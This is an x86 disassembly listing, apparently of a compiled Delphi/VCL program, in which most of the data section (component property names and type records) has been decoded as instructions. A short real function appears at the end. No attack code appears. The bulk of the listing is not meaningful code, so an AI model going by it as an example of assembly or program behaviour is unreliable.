inc ecx
add [ eax + 0x1c00419b ] al
daa
inc ebx
add al bh
sub [ eax + eax + 0x14 ] eax
das
inc esp
add [ eax + 0x2e ] ah
inc esp
add [ eax ] dl
scasd [ edi ]
inc ebx
add [ esp + 0x44 ] dh
add [ esp + 0x21ac0044 ] dl
inc esp
add [ eax - 0x52 ] bl
inc ebx
add [ esi + ebp * 4 + 0x43 ] bl
add [ eax - 0x22 ] dh
inc ebx
add [ esi + ebx * 8 + 0x1a740043 ] bl
inc ebx
insb
jae r-xdata
xor al 0x40
insb
add [ gs : eax ] eax
add [ eax - 0x43ffbcdf ] cl
xor [ eax ] eax
fdiv [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ ecx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
add [ eax ] al
add [ eax + 0x4f0a003a ] al
outsb
dec ebx
jns r-xdata
outsd
inc ebx
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003c ] al
outsb
dec ebp
outsd
jne r-xdata
jae r-xdata
add al bl
add [ eax ] al
jae r-xdata
add al bl
add [ eax ] eax
inc ebp
outsb
inc esp
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor eax 0x6e4f0900
jno r-xdata
outsb
push ebx
je r-xdata
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0040 ] al
rcl [ eax + 0x42e4 ] 0x0
add [ eax ] al
lodsb [ esi ]
in eax 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x65ffbd1b ] al
add [ esi ] al
jae r-xdata
inc ecx
add [ eax + 0x34 ] ah
inc eax
add [ esp + edx * 4 + 0x34680041 ] dh
inc eax
in eax 0x42
inc esp
jb r-xdata
jae r-xdata
push ebp
arpl [ ebx + 0x18 ] bp
jb r-xdata
inc esp
outsd
ja r-xdata
add [ eax ] al
add [ ebx ] al
jo r-xdata
push ebp
outsd
arpl [ ebx + 0x60 ] bp
jb r-xdata
add [ eax + 0x4f0a0034 ] al
outsb
inc esp
jb r-xdata
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ edi + esi * 8 ] cl
inc ebx
add [ esi + edi + 0x29b00041 ] bh
inc ebx
add [ eax + esi * 4 - 0x1c3fffbd ] bl
inc ebx
xor [ eax ] eax
lodsb [ esi ]
daa
inc ebx
add ah ah
inc esp
dec esi
add [ edx + 0x2c0042e5 ] bl
add al [ eax ]
add [ eax - 0x27 ] al
inc edx
add [ eax - 0x65 ] ah
add [ eax ] al
add [ ebp + 0x42 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
and ch 0x42
lea eax [ bx + si ]
clc
jecxz r-xdata
in eax 0x42
outsd
outsb
or al 0x73
jae r-xdata
je r-xdata
je r-xdata
inc edx
inc esp
add [ edx + eax ] ch
add [ eax ] al
inc eax
fld [ edx ]
pushad
fwait
inc edx
outsd
jb r-xdata
add [ eax ] al
add ah dh
jecxz r-xdata
outsd
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003f ] al
outsb
push ebx
je r-xdata
inc eax
add [ edi + 0x2ee40043 ] ch
jpe r-xdata
insb
or dh [ ebx + 0x73 ]
push esi
jb r-xdata
jb r-xdata
inc esp
outsb
je r-xdata
inc ebx
imul esp [ ebx + 0x61 ] 0x7373066c
inc edx
outsd
je r-xdata
je r-xdata
inc esp
add al bl
add ah dl
scasd [ edi ]
inc ebx
add [ eax ] ch
mov ebx 0xbaa00043
inc ebx
add [ ebp + edi * 4 - 0x439fffbd ] dh
inc ebx
add al ah
std
inc ebx
add [ eax ] ah
fild [ ebx ]
add [ edx ] ah
inc esp
add [ edx + 0x1db80044 ] bh
inc esp
add [ eax + 0x38004422 ] ah
in al 0x43
add ah cl
0xf86c0043 0x43
inc ebx
add [ edx + ebx + 0x43 ] dh
add [ ecx + edi * 4 - 0x6487ffbd ] dh
inc ecx
add [ eax - 0x68 ] ah
add al al
jecxz r-xdata
mov al 0x43
je r-xdata
inc ebx
sub_42f41a
inc edx
add [ eax + eax ] ch
add [ eax ] al
pushad
jpo r-xdata
inc ebx
add [ eax - 0x6fffbcb7 ] al
stosb [ edi ]
inc ebx
add [ ecx + eax * 4 - 0x1f17ffbc ] bh
inc ebx
add [ eax ] cl
lodsb [ esi ]
inc ebx
add ah al
stosb [ edi ]
inc ebx
add [ edx + eax * 4 ] cl
inc esp
add [ eax ] ah
add [ eax + eax - 0x4 ] 0xaa
inc ebx
add [ eax - 0x7e ] cl
inc esp
add [ eax - 0x55 ] bl
inc ebx
add [ eax + 0x78004349 ] bh
stosd [ edi ]
inc ebx
add [ eax - 0x7e ] bl
inc esp
add al dh
loopne r-xdata
add [ esp + esi + 0x40 ] dl
add [ eax + 0x34 ] ah
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] ch
inc eax
add [ esp + esi + 0x40 ] bl
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ esp + ebx * 4 + 0x41 ] cl
add [ ecx + ecx * 2 + 0x43 ] bl
add [ eax + 0x3000419c ] al
stosd [ edi ]
inc ebx
add [ esp + ebx * 4 - 0x5423ffbf ] dh
inc ebx
add [ esp + ebx * 4 ] al
inc ecx
add [ eax - 0x13ffbe64 ] bl
pushfd
inc ecx
add [ edx + ebp * 4 ] bl
inc edx
add [ eax ] al
add [ esp + ebp * 4 + 0x43 ] ch
add [ esp + ebp * 4 - 0x5467ffbd ] ch
inc ebx
add [ edx + eax * 4 + 0x44 ] ch
add [ eax - 0x7e ] dh
inc esp
add [ ebx + ebp * 4 - 0x56d3ffbd ] bh
inc ebx
add [ ecx ] dl
push esp
inc edx
jne r-xdata
inc ecx
add [ eax - 0x68 ] ah
inc ecx
add [ eax - 0x68 ] bl
inc ecx
add [ eax + 0x1c00419b ] al
dec edx
inc ebx
add al bh
sub [ eax + eax + 0x14 ] eax
das
inc esp
add [ eax + 0x2e ] ah
inc esp
add [ eax ] dl
scasd [ edi ]
inc ebx
add [ esp + 0x44 ] dh
add [ esp + 0x21ac0044 ] dl
inc esp
add [ eax - 0x52 ] bl
inc ebx
add [ esi + ebp * 4 + 0x43 ] bl
add [ eax - 0x22 ] dh
inc ebx
add [ esi + ebx * 8 - 0x4663ffbd ] bl
inc ebx
add ah dl
scasd [ edi ]
inc ebx
add [ eax ] ch
mov ebx 0xbaa00043
inc ebx
add [ ebp + edi * 4 - 0x439fffbd ] dh
inc ebx
add al ch
dec edx
inc ebx
add [ eax ] ah
fild [ ebx ]
add [ edx ] ah
inc esp
add [ edx + 0x1db80044 ] bh
inc esp
add [ eax + 0x38004422 ] ah
in al 0x43
add ah cl
0xf86c0043 0x43
mov ecx 0x9b780043
je r-xdata
inc ebx
add [ ecx + edi * 4 - 0x6487ffbd ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
cmc
inc edx
add [ edx ] cl
test [ edx ] 0xc
add al [ eax ]
add [ esi + edi * 2 ] dh
inc ebx
add [ eax - 0x65 ] ah
inc ecx
add [ eax + 0x34 ] ah
inc eax
add [ esp + edx * 4 + 0x34680041 ] dh
inc eax
add [ edi + edi * 8 + 0x43 ] al
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ edx ] bl
inc ebx
add ah ah
inc esp
add [ edi + esi * 8 ] cl
inc ebx
add [ esi + edi - 0x235fffbf ] bh
inc ebx
add [ eax + esi * 4 - 0x1c3fffbd ] bl
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0xf520c08b
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
test [ edx ] 0x0
sub_42f64c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test al 0xf7
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x9 ] ch
inc edx
add [ edx + 0x180042f7 ] bl
add al [ eax ]
add ah dl
hlt
sub_42f672
inc edx
add [ eax - 0x65 ] ah
inc ecx
add [ eax + 0x34 ] ah
inc eax
add [ esp + edx * 4 + 0x34680041 ] dh
inc eax
add [ edi + edi * 8 + 0x43 ] al
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ edx ] bl
inc ebx
add ah ah
inc esp
add [ edi + esi * 8 ] cl
inc ebx
add [ esi + edi - 0x235fffbf ] bh
inc ebx
add [ eax + esi * 4 - 0x1c3fffbd ] bl
inc ebx
add [ ecx + edi * 4 - 0x6487ffbd ] dh
inc ecx
add [ eax - 0x68 ] ah
inc ecx
add [ eax - 0x68 ] bl
inc ecx
add [ eax + 0x1000419b ] al
dec esp
inc ebx
add al bh
sub [ eax + eax + 0x14 ] eax
das
inc esp
add [ eax + 0x2e ] ah
inc esp
add [ eax ] dl
scasd [ edi ]
inc ebx
add [ esp + 0x44 ] dh
add [ esp + 0x21ac0044 ] dl
inc esp
add [ eax - 0x52 ] bl
inc ebx
add [ esi + ebp * 4 + 0x43 ] bl
add [ eax - 0x22 ] dh
inc ebx
add [ esi + ebx * 8 - 0x4663ffbd ] bl
inc ebx
add ah dl
scasd [ edi ]
inc ebx
add [ eax ] ch
mov ebx 0xbaa00043
inc ebx
add [ ebp + edi * 4 - 0x439fffbd ] dh
inc ebx
add al ch
dec edx
inc ebx
add [ eax ] ah
fild [ ebx ]
add [ edx ] ah
inc esp
add [ edx + 0x1db80044 ] bh
inc esp
add [ eax + 0x38004422 ] ah
in al 0x43
add ah cl
0xf86c0043 0x43
sub_42f72c
and al 0x4d
inc ebx
add [ ebp + esi * 8 + 0x43 ] dl
add [ eax + 0x4d ] ah
inc ebx
add [ ecx + edi * 8 ] al
inc ebx
add [ eax ] cl
stc
inc ebx
add al al
test [ ebx ] sub_43f768
loopne r-xdata
mov al 0x7
mov al 0x11
mov ebp 0x14bd35
jmp r-xdata
inc esp
add [ eax - 0x4bffbbff ] dh
xor eax 0x205c0044
inc esp
add [ ebx + 0x44 ] cl
add al al
dec edx
inc ebx
add ah ah
dec edx
inc ebx
add [ esp + ecx * 2 + 0x80043 ] bl
add eax 0x7b006b0
dec eax
dec [ ebp + ecx * 2 + 0x4dfc0043 ]
inc ebx
add [ eax + 0x7800434e ] al
dec ebp
inc ebx
add [ eax ] al
dec edi
inc ebx
add ah dl
dec esi
inc ebx
add [ esp + ecx * 2 + 0x43 ] dh
add [ eax + 0x700434c ] bl
push esp
inc edx
jne r-xdata
add dh bh
je r-xdata
push [ eax ]
outsb
mov eax eax
test al 0xf7
inc edx
add [ edi ] al
pop es
push esp
inc edx
jne r-xdata
add [ eax ] cl
inc edx
je r-xdata
fwait
add [ eax ] al
[ ebx + 0x1ff0000 ]
imul ebp [ edi + 0x6e ] r-xdata
je r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
adc [ edx ] eax
add bh bh
add [ eax + 0x4208000d ] al
outsb
xchg esp eax
test [ edx ] 0x1c
test [ edx ] 0x31
add [ eax ] cl
push ebx
je r-xdata
add bh bh
mov eax 0x10043e0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0010 ] al
outsd
outsb
jae r-xdata
push cs
add [ esi ] al
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
adc [ esi + 0x43 ] ch
add ah cl
mov ebx 0xbbfc0043
inc ebx
add al ah
fild [ ebx ]
add [ eax ] al
add [ eax - 0x80000000 ] al
sldt [ edi ]
inc ebx
popad
jo r-xdata
or [ edx + 0x69 ] al
inc esp
imul ecx [ ebp + 0x6f ] 0x10006564
inc eax
add [ ecx ] dl
add al [ eax ]
call [ ecx ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
inc ebx
je r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
jb r-xdata
adc [ edx ] eax
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
jae r-xdata
add [ eax ] al
adc eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ eax ] dl
add al [ eax ]
push eax
dec esp
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
popad
add [ eax ] al
jmp [ eax ]
add [ eax + 0x24 ] dh
inc ecx
add [ eax + eax ] bh
add dh bh
inc eax
scasd [ edi ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4106000b ] al
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
push 0x6100436e
add [ eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
inc [ eax ]
fadd [ ebx ]
add [ eax ] al
add [ eax + 0x1 ] al
adc eax 0x6e450700
popad
bound ebp [ ebp + 0x64 ]
fsubr [ esi + 0x680041 ]
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop ss
add [ ebx ] cl
dec ebp
outsd
popad
insb
push edx
jae r-xdata
inc ebx
add [ edx + eax ] dl
add bh bh
adc al 0x2
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebx
add [ edx ] bh
add bh bh
jpe r-xdata
dec eax
imul ebp [ esi + 0x74 ] r-xdata
jl r-xdata
insb
je r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc al [ eax ]
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
add bh bh
test [ ebx + 0x10043 ] bh
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb eax [ eax ]
or [ eax + 0x6f ] edx
jo r-xdata
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
outsd
outsb
je r-xdata
inc eax
mov esp 0xbcd00043
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040016 ] al
jae r-xdata
in al dx
mov edx 0xdc600043
inc ebx
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
pop ds
add [ edi ] al
push esi
imul esi [ ebx + 0x69 ] 0x656c62
adc [ eax ] al
or [ edx ] eax
add bh bh
cld
dec ebx
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and [ eax ] al
or [ edi + 0x6f ] dl
jb r-xdata
jo r-xdata
add bh bh
sar [ ebx + eax * 2 + 0x43bcd000 ] 0x0
add [ eax ] al
add [ eax - 0x80000000 ] al
push ss
add [ esi + eax * 2 ] al
jb r-xdata
add [ eax ] al
and [ ebx ] 0x0
or cl [ edi + 0x6e ]
inc esp
jb r-xdata
push edi
jb r-xdata
movsb [ edi ] [ esi ]
add [ eax ] eax
inc [ eax ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push ds
add [ edi ] al
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
outsb
jne r-xdata
adc [ eax ] eax
pop es
inc esp
popa
jne r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
insd
inc ebx
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] 0x0
add [ eax + 0x4f090026 ] al
inc esp
jb r-xdata
jo r-xdata
adc [ eax ] al
push edi
add [ eax ] al
adc [ eax ] al
cdq
add [ eax ] al
[ edi * 4 - 0x431bffbd ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308001c ] al
dec ebx
jns r-xdata
sub al 0x10
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
adc [ ecx ] al
rol [ ecx ] 0x0
jo r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0022 ] al
outsb
inc ebx
outsd
outsb
je r-xdata
adc [ ecx ] al
push 0x6948776f
outsb
je r-xdata
insd
inc ebx
add [ eax + 0x25 ] ch
inc esp
add al ch
and eax 0x10044
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
sbb eax 0x61540800
bound ecx [ edi + 0x72 ]
jb r-xdata
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
jns r-xdata
jb r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax 0x6e4f0900
jno r-xdata
inc ebp
outsb
inc esp
add [ eax ] al
js r-xdata
adc [ eax ] al
loopne r-xdata
jo r-xdata
jo r-xdata
hlt
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax 0x6e4f0b00
jb r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] eax
or [ edi + 0x6e ] ecx
adc [ ecx ] al
enter 0x1 0xff
enter 0x1 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] al
push es
dec edi
outsb
inc ebp
js r-xdata
sub al 0x10
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060028 ] al
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
arpl [ ebx + 0x60 ] bp
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0024 ] al
outsb
inc esp
jb r-xdata
jb r-xdata
push eax
outsd
jo r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : ecx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
add [ eax ] al
add [ eax + 0x4f0a002a ] al
outsb
dec ebx
jns r-xdata
outsd
inc ebx
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002c ] al
outsb
dec ebp
outsd
jne r-xdata
jae r-xdata
add al bl
add [ eax ] al
popad
dec ebp
outsd
jbe r-xdata
dec ebp
outsd
jne r-xdata
dec edi
outsb
jae r-xdata
jns r-xdata
je r-xdata
add [ eax + 0x4f070027 ] al
add [ eax ] al
dec edi
outsb
inc ebp
outsb
inc esp
jb r-xdata
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
jo r-xdata
add [ eax ] al
aam 0xf4
inc edx
add [ eax - 0x65 ] ah
inc ecx
add [ eax + 0x34 ] ah
inc eax
add [ esp + edx * 4 + 0x34680041 ] dh
adc al 0x2
push ebp
arpl [ ebx + 0x18 ] bp
jb r-xdata
inc esp
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
jo r-xdata
push ebp
dec edi
int3
add [ eax ] al
jmp eax
test al 0x70
inc ebx
add al ch
add [ eax ] eax
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ es : ecx ] cl
dec edi
jo r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
and [ ecx ] al
add bh bh
and [ ecx ] al
add bh bh
sbb ah 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070021 ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and al [ eax ]
push cs
dec edi
jno r-xdata
je r-xdata
je r-xdata
dec esi
inc [ edx ]
outsb
push ebx
je r-xdata
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0030 ] al
inc esp
add [ eax + esi * 4 - 0x1c3fffbd ] bl
inc ebx
jb r-xdata
jae r-xdata
add al bl
add [ eax ] eax
add [ edi ] al
dec edi
jb r-xdata
jbe r-xdata
dec edi
add al ch
add [ eax ] al
add [ esi + edi * 8 ] dh
inc edx
add [ esi - 0x2 ] cl
inc edx
add [ edx + eax ] dl
outsd
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002f ] al
outsb
push ebx
je r-xdata
inc ecx
add [ eax + 0x4c00419b ] al
dec edi
inc ebx
add al bh
sub [ eax + eax + 0x14 ] eax
das
inc esp
add [ eax + 0x2e ] ah
inc esp
add [ eax ] dl
scasd [ edi ]
inc ebx
add [ esp + 0x44 ] dh
add [ esp + 0x21ac0044 ] dl
inc esp
add [ eax - 0x52 ] bl
inc ebx
add [ esi + ebp * 4 + 0x43 ] bl
add [ eax - 0x22 ] dh
inc ebx
add [ esi + ebx * 8 - 0x4663ffbd ] bl
inc ebx
add ah dl
scasd [ edi ]
inc ebx
add [ eax ] ch
mov ebx 0xbaa00043
inc ebx
add [ ebp + edi * 4 - 0x439fffbd ] dh
inc ebx
add al ch
dec edx
inc ebx
add [ eax ] ah
fild [ ebx ]
add [ edx ] ah
inc esp
add [ edx + 0x1db80044 ] bh
inc esp
add [ eax + 0x38004422 ] ah
in al 0x43
add ah cl
0xf86c0043 0x43
pop eax
cwde
inc esp
jb r-xdata
popad
add [ eax + 0x4f090025 ] al
outsb
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc eax
add [ edi + edi * 8 + 0x43 ] al
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ edx ] bl
xchg esp eax
inc ecx
add [ eax + 0x34 ] ch
jb r-xdata
add [ ecx + edi * 4 - 0x6487ffbd ] dh
inc ecx
add [ eax - 0x68 ] ah
inc ecx
add [ eax - 0x68 ] bl
shl bl 0x43
std
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x2 ] ah
inc edx
add [ eax ] al
add [ eax ] al
inc ebx
add ah ah
inc esp
add [ edi + esi * 8 ] cl
inc ebx
add [ esi + edi - 0x235fffbf ] bh
inc ebx
inc esp
sub_42fe3f
push ecx
inc ebx
add al cl
push ecx
inc ebx
add [ edx + edx * 2 + 0x43 ] cl
add [ edi + ecx * 2 + 0x540c0043 ] dh
push edx
popad
imul ebp [ fs : edi + 0x42 ] 0x6f747475
outsb
nop
pushad
inc [ edx ]
pop es
or al 0x54
push edx
popad
imul ebp [ fs : edi + 0x42 ] 0x6f747475
outsb
std
inc edx
add [ esi + esi * 8 ] bl
inc edx
add [ 0x74530800 ] dh
inc ebx
je r-xdata
push [ eax ]
add dh bh
insb
jae r-xdata
loopne r-xdata
add [ eax + 0x24 ] dh
inc ecx
add [ eax + eax ] bh
add dh bh
inc eax
scasd [ edi ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4106000b ] al
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
mov esp 0x1000410e
add al [ eax ]
jmp eax
add [ eax ] 0x0
add [ eax + 0x4208000e ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x1065646f
outsb
inc ebx
add ah cl
mov ebx 0xbbfc0043
inc ebx
add al ah
fild [ ebx ]
add [ eax ] al
add [ eax - 0x80000000 ] al
sldt [ edi ]
inc ebx
popad
jo r-xdata
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
push 0x6100436e
add [ eax ] al
jmp [ eax ]
and eax 0x25300044
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050013 ] al
je r-xdata
imul ebp [ edi + 0x6e ] r-xdata
enter 0x0 0xfe
int3
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
inc [ eax ]
fadd [ ebx ]
add [ eax ] al
add [ eax + 0x1 ] al
pop ss
add [ edi ] al
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
fsubr [ esi + 0x680041 ]
xor eax [ eax + ebp + 0x67 ]
inc ebx
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc al 0x0
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
outsd
outsb
je r-xdata
inc eax
mov esp 0xbcd00043
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040018 ] al
jae r-xdata
add bh bh
sar [ ebx + eax * 2 + 0x43bcd000 ] 0x0
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb [ eax ] al
add al 0x46
jb r-xdata
add [ edx ] bh
add bh bh
jpe r-xdata
inc esp
add [ eax ] dh
and eax 0x44
add [ eax - 0x80000000 ] al
adc eax [ eax ]
add eax 0x336c7443
inc esp
sub [ edi + 0x43 ] ah
insd
inc ebx
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc eax 0x72440800
popad
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
sub_42fef7
mov esp 0x43
add [ eax - 0x80000000 ] al
push cs
add [ eax ] cl
inc edx
imul eax [ ecx + ebp * 2 + 0x4d ] 0x1065646f
outsb
inc ebx
add ah cl
mov ebx 0xbbfc0043
inc ebx
add al ah
fild [ ebx ]
add [ eax ] al
add [ eax - 0x80000000 ] al
sldt [ edi ]
inc ebx
popad
jo r-xdata
and eax 0x25300044
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050013 ] al
je r-xdata
imul ebp [ edi + 0x6e ] r-xdata
enter 0x0 0xfe
int3
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
inc [ eax ]
fadd [ ebx ]
add [ eax ] al
add [ eax + 0x1 ] al
pop ss
add [ edi ] al
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
fsubr [ esi + 0x680041 ]
xor eax [ eax + ebp + 0x67 ]
inc ebx
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc al 0x0
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
outsd
outsb
je r-xdata
inc eax
mov esp 0xbcd00043
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040018 ] al
jae r-xdata
add bh bh
sar [ ebx + eax * 2 + 0x43bcd000 ] 0x0
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb [ eax ] al
add al 0x46
jb r-xdata
add [ edx ] bh
add bh bh
jpe r-xdata
inc esp
add [ eax ] dh
and eax 0x44
add [ eax - 0x80000000 ] al
adc eax [ eax ]
add eax 0x336c7443
inc esp
sub [ edi + 0x43 ] ah
insd
inc ebx
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc eax 0x72440800
popad
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
sub_430e1c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_444030
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0xb9
mov eax esi
call sub_43b388
mov edx 0x69
mov eax esi
call sub_43b3ac
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403530
mov eax esi
pop esi
pop ebx
retn
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_430e78
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43e438
